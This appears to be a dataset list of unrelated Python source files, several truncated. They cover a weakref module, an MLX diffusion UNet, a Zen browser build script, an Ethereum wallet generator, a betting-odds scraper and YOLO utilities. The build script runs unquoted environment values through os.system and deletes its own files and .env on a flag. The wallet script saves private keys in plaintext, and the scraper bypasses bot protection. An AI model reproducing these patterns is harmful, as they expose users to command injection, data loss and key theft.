    "\"\"\"Weak reference support for Python.\n\nThis module is an implementation of PEP 205:\n\nhttps://peps.python.org/pep-0205/\n\"\"\"\n\n# Naming convention: Variables named \"wr\" are weak reference objects;\n# they are called this instead of \"ref\" to avoid name collisions with\n# the module-global ref() function imported from _weakref.\n\nfrom _weakref import (\n     getweakrefcount,\n     getweakrefs,\n     ref,\n     proxy,\n     CallableProxyType,\n     ProxyType,\n     ReferenceType,\n     _remove_dead_weakref)\n\nfrom _weakrefset import WeakSet, _IterationGuard\n\nimport _collections_abc  # Import after _weakref to avoid circular import.\nimport sys\nimport itertools\n\nProxyTypes = (ProxyType, CallableProxyType)\n\n__all__ = [\"ref\", \"proxy\", \"getweakrefcount\", \"getweakrefs\",\n           \"WeakKeyDictionary\", \"ReferenceType\", \"ProxyType\",\n           \"CallableProxyType\", \"ProxyTypes\", \"WeakValueDictionary\",\n           \"WeakSet\", \"WeakMethod\", \"finalize\"]\n\n\n_collections_abc.MutableSet.register(WeakSet)\n\nclass WeakMethod(ref):\n    \"\"\"\n    A custom `weakref.ref` subclass which simulates a weak reference to\n    a bound method, working around the lifetime problem of bound methods.\n    \"\"\"\n\n    __slots__ = \"_func_ref\", \"_meth_type\", \"_alive\", \"__weakref__\"\n\n    def __new__(cls, meth, callback=None):\n        try:\n            obj = meth.__self__\n            func = meth.__func__\n        except AttributeError:\n            raise TypeError(\"argument should be a bound method, not {}\"\n                            .format(type(meth))) from None\n        def _cb(arg):\n            # The self-weakref trick is needed to avoid creating a reference\n            # cycle.\n            self = self_wr()\n            if self._alive:\n                self._alive = False\n                if callback is not None:\n                    callback(self)\n        self = ref.__new__(cls, obj, _cb)\n        self._func_ref = ref(func, _cb)\n        self._meth_type = type(meth)\n        self._alive = True\n        self_wr = ref(self)\n        return self\n\n    def __call__(self):\n        obj = super().__call__()\n        func = self._func_ref()\n        if obj is None or func is None:\n            return None\n        return self._meth_type(func, obj)\n\n    def __eq__(self, other):\n        if isinstance(other, WeakMethod):\n            if not self._alive or not other._alive:\n                return self is other\n            return ref.__eq__(self, other) and self._func_ref == other._func_ref\n        return NotImplemented\n\n    def __ne__(self, other):\n        if isinstance(other, WeakMethod):\n            if not self._alive or not other._alive:\n                return self is not other\n            return ref.__ne__(self, other) or self._func_ref != other._func_ref\n        return NotImplemented\n\n    __hash__ = ref.__hash__\n\n\nclass WeakValueDictionary(_collections_abc.MutableMapping):\n    \"\"\"Mapping class that references values weakly.\n\n    Entries in the dictionary will be discarded when no strong\n    reference to the value exists anymore\n    \"\"\"\n    # We inherit the constructor without worrying about the input\n    # dictionary; since it uses our .update() method, we get the right\n    # checks (if the other dictionary is a WeakValueDictionary,\n    # objects are unwrapped on the way out, and we always wrap on the\n    # way in).\n\n    def __init__(self, other=(), /, **kw):\n        def remove(wr, selfref=ref(self), _atomic_removal=_remove_dead_weakref):\n            self = selfref()\n            if self is not None:\n                if self._iterating:\n                    self._pending_removals.append(wr.key)\n                else:\n                    # Atomic removal is necessary since this function\n                    # can be called asynchronously by the GC\n                    _atomic_removal(self.data, wr.key)\n        self._remove = remove\n        # A list of keys to be removed\n        self._pending_removals = []\n        self._iterating = set()\n        self.data = {}\n        self.update(other, **kw)\n\n    def _commit_removals(self, _atomic_removal=_remove_dead_weakref):\n        pop = self._pending_removals.pop\n        d = self.data\n        # We shouldn't encounter any KeyError, because this method should\n        # always be called *before* mutating the dict.\n        while True:\n            try:\n                key = pop()\n            except IndexError:\n                return\n            _atomic_removal(d, key)\n\n    def __getitem__(self, key):\n        if self._pending_removals:\n            self._commit_removals()\n        o = self.data[key]()\n        if o is None:\n            raise KeyError(key)\n        else:\n            return o\n\n    def __delitem__(self, key):\n        if self._pending_removals:\n            self._commit_removals()\n        del self.data[key]\n\n    def __len__(self):\n        if self._pending_removals:\n            self._commit_removals()\n        return len(self.data)\n\n    def __contains__(self, key):\n        if self._pending_removals:\n            self._commit_removals()\n        try:\n            o",
    "from typing import Any, List\nfrom dataclasses import dataclass\n\nimport mlx.core as mx\nimport mlx.nn as nn\nimport mlx.optimizers as optim\nimport numpy as np\nimport mnist\nimport math\nfrom tqdm import tqdm\nimport cv2\n\n# Parameters\nnum_epochs = 10\nlr = 0.0001\nbatch_size = 128\ntimesteps = 1000\ndim_encoding = 10\n\n\n# Definition of the input of the NN\n@dataclass\nclass Input:\n    image: mx.array\n    number: mx.array\n    t: mx.array\n\n\n# Upsample class\nclass UpSample(nn.Module):\n    def __init__(self, scale: int = 2):\n        super().__init__()\n        self.scale = scale\n\n    def __call__(self, x: mx.array) -> mx.array:\n        B, H, W, C = x.shape\n        x = mx.broadcast_to(\n            x[:, :, None, :, None, :], (B, H, self.scale, W, self.scale, C)\n        )\n        x = x.reshape(B, H * self.scale, W * self.scale, C)\n        return x\n\n\n# Sinusoidal embedding for time encoding\nclass SinusoidalPosEmb(nn.Module):\n    def __init__(self, dim, theta=10000):\n        super().__init__()\n        self.dim = dim\n        self.theta = theta\n\n    def __call__(self, x):\n        half_dim = self.dim // 2\n        emb = math.log(self.theta) / (half_dim - 1)\n        emb = mx.exp(mx.arange(half_dim) * -emb)\n        emb = x[:, None] * emb[None, :]\n        emb = mx.concatenate((emb.sin(), emb.cos()), axis=-1)\n        return emb\n\n\n# Define InvertedResidualBlock in MLX\nclass InvertedResidualBlock(nn.Module):\n    def __init__(self, channels: int, dilation: int):\n        super().__init__()\n        self.conv_in = nn.Conv2d(channels, channels * dilation, 3, padding=1)\n        self.conv_rb = nn.Conv2d(\n            channels * dilation, channels, 3, padding=1\n        )  # This should be two different conv but we don't have depth wise conv\n        self.norm = nn.GroupNorm(channels, channels, pytorch_compatible=True)\n\n    def __call__(self, x: mx.array) -> mx.array:\n        y = self.norm(x)\n        y = self.conv_in(x)\n        y = nn.gelu(y)\n        y = self.conv_rb(y)\n        return x + y\n\n\n# Define UNet in MLX\nclass UNet(nn.Module):\n    def __init__(\n        self,\n        mlp_time: int = [10, 32],\n        mlp_number: int = [32, 32],\n        channels: List[int] = [16, 32, 64, 128, 256],\n        dilations: List[int] = [2, 2, 2, 2, 2],\n        strides: List[int] = [1, 1, 2, 2, 2],\n    ):\n        super().__init__()\n        assert len(channels) == len(strides) == len(dilations)\n        self._strides = strides\n\n        self.number_embeddings = nn.Embedding(10, mlp_number[0])\n\n        self.levels_downsample = []\n        self.time_mlps = []\n        self.number_mlps = []\n        self.levels_upsample = []\n        in_channel = 1\n        # Define encoder and decoder\n        for n, (channel, dilation, stride) in enumerate(\n            zip(channels, dilations, strides)\n        ):\n            # encoder\n            self.levels_downsample.append(\n                nn.Sequential(\n                    nn.Conv2d(in_channel, channel, 3, stride=stride, padding=1),\n                    nn.GELU(),\n                    InvertedResidualBlock(channel, dilation),\n                )\n            )\n            # time net\n            mlp = [\n                [nn.Linear(idim, odim), nn.GELU()]\n                for idim, odim in zip(mlp_time[:-1], mlp_time[1:])\n            ]\n            mlp = [item for sublist in mlp for item in sublist]\n            mlp.append(nn.Linear(mlp_time[-1], channel * 2))\n            self.time_mlps.append(nn.Sequential(*mlp))\n            # number net\n            mlp = [\n                [nn.Linear(idim, odim), nn.GELU()]\n                for idim, odim in zip(mlp_number[:-1], mlp_number[1:])\n            ]\n            mlp = [item for sublist in mlp for item in sublist]\n            mlp.append(nn.Linear(mlp_number[-1], channel * 2))\n            self.number_mlps.append(nn.Sequential(*mlp))\n\n            # decoder\n            channel_upsample = channel if n == len(channels) - 1 else channel * 2\n            self.levels_upsample.append(\n                nn.Sequential(\n                    UpSample(stride),\n                    nn.Conv2d(channel_upsample, in_channel, 3, stride=1, padding=1),\n                    nn.GELU(),\n                    InvertedResidualBlock(in_channel, dilation),\n                )\n            )\n\n            in_channel = channel\n\n        # Reverse the decoder from bottleneck to output\n        self.levels_upsample.reverse()\n\n    def __call__(self, input: Input) -> mx.array:\n        x, number, t = input.image, input.number, input.t\n\n        # Encoder\n        features = []\n        for level_downsample, time_mlp, number_mlp in zip(\n            self.levels_downsample, self.time_mlps, self.number_mlps\n        ):\n            x = level_downsample(x)\n\n            # Infuse time\n            t_elab = time_mlp(t)\n            t_elab = t_elab.reshape([t_elab.shape[0], 1, 1, t_elab.shape[1]])\n            scale, offset = t_elab[..., : x.shape[-1]], t_elab[..., x.shape[-1] :]\n            x = x * scale + offset\n\n            # Infuse number\n            n_elab = number_mlp(sel",
    "from .config import settings\n\n\nclass TextChunker:\n    \"\"\"A class to handle intelligent text chunking for voice generation.\"\"\"\n\n    def __init__(self):\n        \"\"\"Initialize the TextChunker with break points and priorities.\"\"\"\n        self.current_text = []\n        self.found_first_sentence = False\n        self.semantic_breaks = {\n            \"however\": 4,\n            \"therefore\": 4,\n            \"furthermore\": 4,\n            \"moreover\": 4,\n            \"nevertheless\": 4,\n            \"while\": 3,\n            \"although\": 3,\n            \"unless\": 3,\n            \"since\": 3,\n            \"and\": 2,\n            \"but\": 2,\n            \"because\": 2,\n            \"then\": 2,\n        }\n        self.punctuation_priorities = {\n            \".\": 5,\n            \"!\": 5,\n            \"?\": 5,\n            \";\": 4,\n            \":\": 4,\n            \",\": 3,\n            \"-\": 2,\n        }\n\n    def should_process(self, text: str) -> bool:\n        \"\"\"Determines if text should be processed based on length or punctuation.\n\n        Args:\n            text (str): The text to check.\n\n        Returns:\n            bool: True if the text should be processed, False otherwise.\n        \"\"\"\n        if any(text.endswith(p) for p in self.punctuation_priorities):\n            return True\n\n        words = text.split()\n        target = (\n            settings.FIRST_SENTENCE_SIZE\n            if not self.found_first_sentence\n            else settings.TARGET_SIZE\n        )\n        return len(words) >= target\n\n    def find_break_point(self, words: list, target_size: int) -> int:\n        \"\"\"Finds optimal break point in text.\n\n        Args:\n            words (list): The list of words to find a break point in.\n            target_size (int): The target size of the chunk.\n\n        Returns:\n            int: The index of the break point.\n        \"\"\"\n        if len(words) <= target_size:\n            return len(words)\n\n        break_points = []\n\n        for i, word in enumerate(words[: target_size + 3]):\n            word_lower = word.lower()\n\n            priority = self.semantic_breaks.get(word_lower, 0)\n            for punct, punct_priority in self.punctuation_priorities.items():\n                if word.endswith(punct):\n                    priority = max(priority, punct_priority)\n\n            if priority > 0:\n                break_points.append((i, priority, -abs(i - target_size)))\n\n        if not break_points:\n            return target_size\n\n        break_points.sort(key=lambda x: (x[1], x[2]), reverse=True)\n        return break_points[0][0] + 1\n\n    def process(self, text: str, audio_queue) -> str:\n        \"\"\"Process text chunk and return remaining text.\n\n        Args:\n            text (str): The text to process.\n            audio_queue: The audio queue to add sentences to.\n\n        Returns:\n            str: The remaining text after processing.\n        \"\"\"\n        if not text:\n            return \"\"\n\n        words = text.split()\n        if not words:\n            return \"\"\n\n        target_size = (\n            settings.FIRST_SENTENCE_SIZE\n            if not self.found_first_sentence\n            else settings.TARGET_SIZE\n        )\n        split_point = self.find_break_point(words, target_size)\n\n        if split_point:\n            chunk = \" \".join(words[:split_point]).strip()\n            if chunk and any(c.isalnum() for c in chunk):\n                chunk = chunk.rstrip(\",\")\n                audio_queue.add_sentences([chunk])\n                self.found_first_sentence = True\n                return \" \".join(words[split_point:]) if split_point < len(words) else \"\"\n\n        return \"\"\n",
    "from dotenv import load_dotenv, find_dotenv\nimport requests\nimport os\nimport sys\nimport shutil\nimport threading\nimport subprocess\n\nload_dotenv(find_dotenv(), override=True)\n\ndef cpu_limiter(percent = 50) -> None:\n    subprocess.run([\"cpulimit\", \"-e\", \"rustc\", \"-l\", str(percent)], shell=True, check=True)\n    \ndef input_request(prompt = \"Are you okay continuing?\", \n                  yes = \"Y\", \n                  no = \"n\", \n                  yOutput=\"Continuing to final step\", \n                  nOutput = \"Not continuing to the next step\") -> bool:\n    yes = yes.lower()\n    no = no.lower()\n\n    while True:\n        response = input(f\"{prompt}\\nPlease write either {yes.upper()}/{no}\").lower()\n        \n        if response == yes:\n            print(yOutput)\n            return True\n        \n        if response == no:\n            print(nOutput) \n            return False\n        print(\"Invalid response. Please try again.\")\n\ndef check_url(url: str) -> bool:\n    print(url)\n    try:\n        return requests.head(url).status_code == 200\n    except requests.ConnectionError:\n        return False\n\n\ndef language_packs(source_path, dest_path, mozconfig, mozconfig_output_path) -> None:\n    # currently only supports linux and windows\n    if sys.platform == \"linux\":\n        os.system(\"cd desktop && sh  scripts/update-en-US-packs.sh\")\n        return\n    \n    shutil.copytree(source_path, dest_path, dirs_exist_ok=True);\n\n    #editing mozconfig\n    with open(mozconfig, 'r') as f:\n        text = f.read().replace(\"$PWD\", mozconfig_output_path)\n        f.close()\n    \n    with open(mozconfig, 'w') as f:\n        f.write(text)\n        f.close()\n    \n\n\ndef grab_repo_name(url: str) -> str:\n    return url.split(\"/\")[-1]\n\ndef main() -> None:\n\n    FORKED_REPO = os.environ.get(\"FORKED_REPO\").replace(\".git\", \"\") # getting the your fork of zen browser\n    L10N_REPO = os.environ.get(\"L10N_REPO\").replace(\".git\", \"\") # getting the l10n packs\n    DESKTOP_DIR = os.path.join(os.getcwd(), grab_repo_name(FORKED_REPO)) # dir for forked repo\n    #check if env variables are set\n    if FORKED_REPO is None or FORKED_REPO == \"\":\n        print(\"FORKED_REPO is not set\");\n        return\n    if L10N_REPO is None or L10N_REPO == \"\": L10N_REPO = \"https://github.com/zen-browser/l10n-packs\"\n\n    #grabbing language pack related files\n    MOZ_CONF_DIR = os.path.join(DESKTOP_DIR, \"configs\", \"common\", \"mozconfig\") # dir for mozconfig\n    MOZ_CONF_OUTPUT_DIR = os.path.join(DESKTOP_DIR, \"engine\") # output dir for mozconfig\n    LANGUAGE_PACKS_DIR = os.path.join(DESKTOP_DIR, \"l10n\", \"en-US\", \"browser\", \"browser\") # dir for language packs\n    LANGUAGE_PACKS_OUTPUT_DIR = os.path.join(MOZ_CONF_OUTPUT_DIR, \"browser\", \"locales\", \"en-US\", \"browser\") # output dir for language packs\n\n    #check if url's are valid\n    if not check_url(FORKED_REPO):\n        print(\"FORKED_REPO is not a valid url\")\n        return \n    if not check_url(L10N_REPO):\n        print(\"L10N_REPO is not a valid url\")\n        return\n    \n    # running commands\n    if not os.path.exists(DESKTOP_DIR):\n        os.system(f\"git clone {FORKED_REPO}\");\n    os.system(f\"git clone {L10N_REPO} \\\"{DESKTOP_DIR}/l10n/\\\"\")\n    os.system(f\"cd \\\"{DESKTOP_DIR}\\\" && npm i && npm run init && npm run bootstrap\")\n\n    # copy language packs\n    language_packs(LANGUAGE_PACKS_DIR, LANGUAGE_PACKS_OUTPUT_DIR, MOZ_CONF_DIR, MOZ_CONF_OUTPUT_DIR)\n\n    if not input_request(\"Would you like to build the browser?\"): return\n\n    if sys.platform == \"linux\":\n        threading.Thread(target=cpu_limiter).start()\n    os.system(f\"cd \\\"{DESKTOP_DIR}\\\" && npm run build\")\n\nif __name__ == \"__main__\":\n    main()\n    if os.environ.get('TERMINATE') == 'true':\n        os.remove('README.md')\n        os.remove('.env')\n        os.remove(__file__)",
    "import os\nimport re\nimport csv\nimport base64\nimport json\nimport xml.etree.ElementTree as ET\n\nimport cv2\nimport requests\nfrom PIL import Image\nfrom ultralytics import YOLO\n\n# Function to read and extract data from the CSV file\ndef read_csv(file_path):\n    try:\n        with open(file_path, mode='r', encoding='utf-8') as csv_file:\n            csv_reader = csv.DictReader(csv_file)  # Read CSV as a dictionary\n            data = [row for row in csv_reader]\n            \n        return data\n    \n    except FileNotFoundError:\n        print(f\"Error: The file '{file_path}' was not found.\")\n        return []\n    except KeyError as e:\n        print(f\"Error: Missing column {e} in the CSV file.\")\n        return []\n    except Exception as e:\n        print(f\"Unexpected error: {e}\")\n        return []\n\ndef download_image_google_drive(image_url):\n    id = image_url.split('=')[-1]\n    \n    try:\n        id = image_url.split('/')[-2]\n    except Exception as e:\n        pass\n        \n    # print(image_url)\n    # print(id)\n    downloadable_url = f\"https://drive.google.com/uc?export=view&id={id}\"\n    # print(downloadable_url)\n    response = requests.get(downloadable_url)\n    \n    if response.status_code == 404:\n        return -1\n    \n    with open(f'temp.png', 'wb') as file:\n        file.write(response.content)\n        \n    return f'temp.png'\n\ndef get_face_center_image(image_path):\n    # image = cv2.imread(image_path)\n    # org_width, org_height = image.shape[1], image.shape[0]\n\n    # # Detect faces in the image\n    # faces = detector.detect_faces(image)\n\n    # if not faces:\n    #     print(\"No face detected!\")\n    # else:\n    #     # Loop through each detected face\n    #     for face in faces:\n    #         # Extract the bounding box of the face\n    #         x1, y1, width, height = face['box']\n    #         x2, y2 = x1 + width, y1 + height\n\n    #         # Crop the image to the detected face\n    #         cropped_image = image[y1:y2, x1:x2]\n\n    #         # Convert the cropped image from BGR to RGB (for PIL)\n    #         cropped_image_rgb = cv2.cvtColor(cropped_image, cv2.COLOR_BGR2RGB)\n            \n    #         # Convert to Pillow Image format for further processing\n    #         pil_image = Image.fromarray(cropped_image_rgb)\n\n    #         # Calculate the dimensions for the final square image\n    #         width, height = pil_image.size\n    #         square_size = max(width, height)  # Use the larger dimension as the new square size\n\n    #         # Create a new square image with a white background\n    #         new_image = Image.new('RGB', (square_size, square_size), (255, 255, 255))\n\n    #         # Calculate the position to center the cropped face\n    #         position = ((square_size - width) // 2, (square_size - height) // 2)\n\n    #         # Paste the cropped face into the center of the new square image\n    #         new_image.paste(pil_image, position)\n\n    #         # Save or display the final centered face image\n    #         new_image.save(image_path)  # or any desired output path\n    #         print(f\"Face cropped and centered, saved as {image_path}\")\n    \n    # Load the pre-trained HOG + SVM detector for detecting people\n\n\n    # Read the image\n\n\n    # Load YOLO\n    # net = cv2.dnn.readNet(\"yolov3.weights\", \"yolov3.cfg\")\n    # layer_names = net.getLayerNames()\n    # output_layers = [layer_names[i - 1] for i in net.getUnconnectedOutLayers()]\n\n    # # Load image\n    # image = cv2.imread(image_path)\n    # height, width, channels = image.shape\n\n    # # Prepare image for YOLO\n    # blob = cv2.dnn.blobFromImage(image, 0.00392, (416, 416), (0, 0, 0), True, crop=False)\n    # net.setInput(blob)\n    # outs = net.forward(output_layers)\n\n    # # Loop over all detections\n    # for out in outs:\n    #     for detection in out:\n    #         scores = detection[5:]\n    #         class_id = np.argmax(scores)\n    #         confidence = scores[class_id]\n\n    #         if confidence > 0.5 and class_id == 0:  # Class ID for person is 0 in YOLO\n    #             center_x = int(detection[0] * width)\n    #             center_y = int(detection[1] * height)\n    #             w = int(detection[2] * width)\n    #             h = int(detection[3] * height)\n\n    #             # Get the bounding box coordinates\n    #             x = center_x - w // 2\n    #             y = center_y - h // 2\n\n    #             # Crop the image around the detected person\n    #             cropped_image = image[y:y+h, x:x+w]\n\n    #             # Convert to Pillow Image format for further processing\n    #             pil_image = Image.fromarray(cropped_image)\n\n    #             # Save or process the cropped image (center it or add padding if needed)\n    #             pil_image.save(image_path)\n    #             print(f\"Person cropped and saved as {image_path}\")\n\n\n    return image_path\n\ndef center_person_in_image(image_path):\n    # Load YOLO model (YOLOv8 pretrained model)\n    model = YOLO('yolov8n.pt')  # 'yolov8n.pt' is a pre-trained lightweight YOLO model\n\n    # Load ",
    "import os\nimport json\nfrom eth_keys import keys\nfrom datetime import datetime\n\ndef create_wallet(username):\n    private_key_bytes = os.urandom(32)\n    private_key = keys.PrivateKey(private_key_bytes)\n    public_key = private_key.public_key\n    address = public_key.to_checksum_address()\n\n    wallet_data = {\n        \"username\": username,\n        \"private_key\": private_key.to_hex(),\n        \"public_key\": public_key.to_hex(),\n        \"address\": address\n    }\n\n    if not os.path.exists(\"wallets\"):\n        os.makedirs(\"wallets\")\n\n    base_filename = f\"wallets/{username.lower()}_wallet.json\"\n    filename = base_filename\n\n    if os.path.exists(filename):\n        timestamp = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n        filename = f\"wallets/{username.lower()}_wallet_{timestamp}.json\"\n\n    with open(filename, \"w\") as wallet_file:\n        json.dump(wallet_data, wallet_file, indent=4)\n\n    print(f\"Wallet file '{filename}' created successfully!\")\n    print(f\"Address: {address}\")\n\nuser_input = input(\"Enter a username for your wallet: \")\ncreate_wallet(user_input)\n",
    "from abc import ABC, abstractmethod\nfrom typing import List, Optional\nfrom .card import Card, Suit, Rank\nfrom .bid import Bid\n\n\nclass Player(ABC):\n    \"\"\"Abstract base class for all player types (human, random, AI, etc.)\"\"\"\n\n    def __init__(self, name: str):\n        self.name = name\n        self.hand: List[Card] = []\n        self.tricks_won = 0\n\n    def get_hcp(self):\n        HIGH_CARD_POINTS = {\n            Rank.ACE: 4,\n            Rank.KING: 3,\n            Rank.QUEEN: 2,\n            Rank.JACK: 1,\n        }\n\n        return sum(\n            HIGH_CARD_POINTS[card.rank]\n            for card in self.hand\n            if card.rank in self.HIGH_CARD_POINTS\n        )\n\n    def get_suit_distribution(self):\n        return {\n            s: len(list(filter(lambda card: card.suit == s, self.hand)))\n            for s in Suit\n            if s != Suit.NO_TRUMP\n        }\n\n    def receive_cards(self, cards: List[Card]):\n        \"\"\"Add cards to the player's hand.\"\"\"\n        self.hand.extend(cards)\n        self.hand.sort(key=lambda card: (card.suit.value, card.rank.value))\n\n    def has_suit(self, suit: Suit) -> bool:\n        \"\"\"Check if player has any cards of the specified suit.\"\"\"\n        return any(card.suit == suit for card in self.hand)\n\n    def get_cards_of_suit(self, suit: Suit) -> List[Card]:\n        \"\"\"Get all cards of the specified suit from player's hand.\"\"\"\n        return [card for card in self.hand if card.suit == suit]\n\n    def play_card(self, card: Card):\n        \"\"\"Remove and return the specified card from player's hand.\"\"\"\n        self.hand.remove(card)\n        return card\n\n    @abstractmethod\n    def make_bid(self, valid_bids: List[Bid]) -> Bid:\n        \"\"\"\n        Make a bid during the bidding phase.\n\n        Args:\n            valid_bids: List of valid bid options\n\n        Returns:\n            Chosen bid\n        \"\"\"\n        pass\n\n    @abstractmethod\n    def choose_card(\n        self, valid_cards: List[Card], trick_suit: Optional[Suit] = None\n    ) -> Card:\n        \"\"\"\n        Choose a card to play from valid options.\n\n        Args:\n            valid_cards: List of valid cards that can be played\n            trick_suit: The suit that must be followed (if any)\n\n        Returns:\n            Chosen card\n        \"\"\"\n        pass\n\n    def __str__(self):\n        return f\"{self.name} ({len(self.hand)} cards)\"\n",
    "import pandas as pd\nimport cloudscraper\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime, timedelta\nfrom concurrent.futures import ThreadPoolExecutor\n\nscraper=cloudscraper.create_scraper()\n\ndef iddaa_bilgi(basla,son):\n    url=\"https://www.mackolik.com/perform/p0/ajax/components/competition/livescores/json?\"\n    basla_tarih=datetime.strptime(basla,\"%Y-%m-%d\")\n    son_tarih=datetime.strptime(son,\"%Y-%m-%d\")\n\n    tum_veri=pd.DataFrame()\n\n    while basla_tarih <= son_tarih:\n        tarih_str=basla_tarih.strftime(\"%Y-%m-%d\")\n        params={\"sports[]\":\"Soccer\",\"matchDate\":tarih_str}\n        r=scraper.get(url,params=params).json()[\"data\"][\"matches\"]\n\n        id,mac,skor,iyskor,iddiakod,tarih_list=[], [], [], [], [], []\n\n        for i in r:\n            id.append(i)\n            tarih_list.append(r[i][\"mstUtc\"])\n            mac.append(r[i][\"matchName\"])\n            score=f\"{r[i]['score'].get('home')}-{r[i]['score'].get('away')}\"\n            skor.append(score)\n            try:\n                iy_skor=f\"{r[i]['score']['ht'].get('home')}-{r[i]['score']['ht'].get('away')}\"\n                iyskor.append(iy_skor)\n            except AttributeError:\n                iyskor.append(\"Veri Yok\")\n            iddiakod.append(str(r[i].get(\"iddaaCode\")))\n\n        veri=pd.DataFrame({\"Tarih\":tarih_list,\"Ma\u00e7\":mac,\"\u0130Y Skor\":iyskor,\"Skor\":skor,\n                             \"\u0130ddia Kodu\":iddiakod,\"ID\":id})\n\n        veri=veri[veri[\"\u0130ddia Kodu\"] != \"None\"]\n        veri.drop(\"\u0130ddia Kodu\",axis=1,inplace=True)\n\n        veri[\"Tarih\"]=pd.to_datetime(veri[\"Tarih\"],unit=\"ms\",utc=True)\n        veri[\"Tarih\"]=veri[\"Tarih\"].dt.tz_convert(\"Europe/Istanbul\")\n        veri[\"Saat\"]=veri[\"Tarih\"].dt.strftime(\"%H:%M\")\n        veri[\"Tarih\"]=veri[\"Tarih\"].dt.strftime(\"%d-%m-%Y\")\n        veri.reset_index(drop=True,inplace=True)\n\n        tum_veri=pd.concat([tum_veri,veri],ignore_index=True)\n        basla_tarih += timedelta(days=1)\n    return tum_veri\n\n\ndef get_bahis_oranlari(i,tarih,saat,mac,skor,iyskor):\n    url=f\"https://www.mackolik.com/mac/gaziantep-fk-vs-pendikspor/iddaa/{i}\"\n    r=scraper.get(url).text\n    s=BeautifulSoup(r,\"html.parser\")\n    ul=s.find(\"ul\",{\"class\":\"widget-iddaa-markets__markets-list\"})\n\n    try:\n        h2_tags=ul.find_all(\"h2\")\n        bahistipi=[h2.find(\"span\").text for h2 in h2_tags]\n\n        div_tags=ul.find_all(\"div\", {\"class\": \"widget-base__content widget-iddaa-markets__market-content\"})\n        ul_tags=[div.find(\"ul\") for div in div_tags]\n\n        bahisoranlar=[]\n        for ul in ul_tags:\n            li_texts=[]\n            for li in ul.find_all(\"li\"):\n                span_texts=[span.get_text(strip=True) for span in li.find_all(\"span\")]\n                li_texts.append(span_texts)\n            bahisoranlar.append(li_texts)\n\n        bahis_sozluk={}\n        for a in range(len(bahistipi)):\n            for j in range(len(bahisoranlar[a])):\n                for k in range(0,len(bahisoranlar[a][j]),2):\n                    key=f\"{bahistipi[a]} ({bahisoranlar[a][j][k]})\"\n                    value=bahisoranlar[a][j][k+1]\n                    bahis_sozluk[key]=value\n\n        bahis_df=pd.DataFrame(list(bahis_sozluk.items()),columns=[\"Bahis T\u00fcr\u00fc\",\"Oran\"])\n        bahis_df[\"Tarih\"]=tarih\n        bahis_df[\"Saat\"]=saat\n        bahis_df[\"Ma\u00e7\"]=mac\n        bahis_df[\"\u0130Y Skor\"]=iyskor\n        bahis_df[\"Skor\"]=skor\n        bahis_df[\"Oran\"]=bahis_df[\"Oran\"].apply(lambda x: str(x).replace('.', ','))\n\n        return bahis_df\n\n    except AttributeError:\n        return None\n\ndef iddaa_bahis_oranlari(basla, son):\n    ids=iddaa_bilgi(basla,son)[\"ID\"]\n    mac=iddaa_bilgi(basla,son)[\"Ma\u00e7\"]\n    iyskor=iddaa_bilgi(basla,son)[\"\u0130Y Skor\"]\n    skor=iddaa_bilgi(basla,son)[\"Skor\"]\n    tarih=iddaa_bilgi(basla,son)[\"Tarih\"]\n    saat=iddaa_bilgi(basla,son)[\"Saat\"]\n\n    tum_bahis_df=pd.DataFrame()\n\n    with ThreadPoolExecutor() as executor:\n        futures=[executor.submit(get_bahis_oranlari,i,tarih.iloc[idx],saat.iloc[idx],mac.iloc[idx],iyskor.iloc[idx],skor.iloc[idx]) for idx, i in enumerate(ids)]\n        for future in futures:\n            bahis_df=future.result()\n            if bahis_df is not None:\n                tum_bahis_df=pd.concat([tum_bahis_df, bahis_df],ignore_index=True)\n\n    tum_bahis_df=tum_bahis_df[[\"Tarih\",\"Saat\",\"Ma\u00e7\",\"\u0130Y Skor\",\"Skor\",\"Bahis T\u00fcr\u00fc\",\"Oran\"]]\n    tum_bahis_df.to_excel(\"bahis_oranlari.xlsx\",index=False)\n\n\n# Tarihleri y\u0131l-ay-g\u00fcn \u015feklinde giriniz\niddaa_bahis_oranlari(\"2024-12-30\",\"2024-12-30\")",
    "# Ultralytics YOLOv5 \ud83d\ude80, AGPL-3.0 license\n\"\"\"Callback utils.\"\"\"\n\nimport threading\n\n\nclass Callbacks:\n    \"\"\"Handles all registered callbacks for YOLOv5 Hooks.\"\"\"\n\n    def __init__(self):\n        \"\"\"Initializes a Callbacks object to manage registered YOLOv5 training event hooks.\"\"\"\n        self._callbacks = {\n            \"on_pretrain_routine_start\": [],\n            \"on_pretrain_routine_end\": [],\n            \"on_train_start\": [],\n            \"on_train_epoch_start\": [],\n            \"on_train_batch_start\": [],\n            \"optimizer_step\": [],\n            \"on_before_zero_grad\": [],\n            \"on_train_batch_end\": [],\n            \"on_train_epoch_end\": [],\n            \"on_val_start\": [],\n            \"on_val_batch_start\": [],\n            \"on_val_image_end\": [],\n            \"on_val_batch_end\": [],\n            \"on_val_end\": [],\n            \"on_fit_epoch_end\": [],  # fit = train + val\n            \"on_model_save\": [],\n            \"on_train_end\": [],\n            \"on_params_update\": [],\n            \"teardown\": [],\n        }\n        self.stop_training = False  # set True to interrupt training\n\n    def register_action(self, hook, name=\"\", callback=None):\n        \"\"\"\n        Register a new action to a callback hook.\n\n        Args:\n            hook: The callback hook name to register the action to\n            name: The name of the action for later reference\n            callback: The callback to fire\n        \"\"\"\n        assert hook in self._callbacks, f\"hook '{hook}' not found in callbacks {self._callbacks}\"\n        assert callable(callback), f\"callback '{callback}' is not callable\"\n        self._callbacks[hook].append({\"name\": name, \"callback\": callback})\n\n    def get_registered_actions(self, hook=None):\n        \"\"\"\n        Returns all the registered actions by callback hook.\n\n        Args:\n            hook: The name of the hook to check, defaults to all\n        \"\"\"\n        return self._callbacks[hook] if hook else self._callbacks\n\n    def run(self, hook, *args, thread=False, **kwargs):\n        \"\"\"\n        Loop through the registered actions and fire all callbacks on main thread.\n\n        Args:\n            hook: The name of the hook to check, defaults to all\n            args: Arguments to receive from YOLOv5\n            thread: (boolean) Run callbacks in daemon thread\n            kwargs: Keyword Arguments to receive from YOLOv5\n        \"\"\"\n        assert hook in self._callbacks, f\"hook '{hook}' not found in callbacks {self._callbacks}\"\n        for logger in self._callbacks[hook]:\n            if thread:\n                threading.Thread(target=logger[\"callback\"], args=args, kwargs=kwargs, daemon=True).start()\n            else:\n                logger[\"callback\"](*args, **kwargs)\n",
